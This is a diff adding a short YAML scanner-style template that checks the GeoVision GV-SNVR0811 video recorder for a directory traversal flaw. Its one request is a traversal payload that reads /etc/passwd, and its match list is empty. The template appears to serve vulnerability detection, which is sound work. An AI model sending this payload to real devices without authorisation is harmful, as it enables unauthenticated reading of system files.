@@ -1,0 +1,18 @@
+id: geovision-lfi
+brief:
+    title: GeoVision GV-SNVR0811 - Directory Traversal
+    by: DhiyaneshDK
+    level: high
+    about: The GeoVision GV-SNVR0811 network video recorder is vulnerable to a Directory Traversal vulnerability, which allows unauthenticated remote attackers to access arbitrary files on the device by manip...
+    label:
+        - geovision
+        - lfi
+        - cross-web
+        - webclient
+        - iot
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/../../../../../../../../../../etc/passwd'
+      signs: []
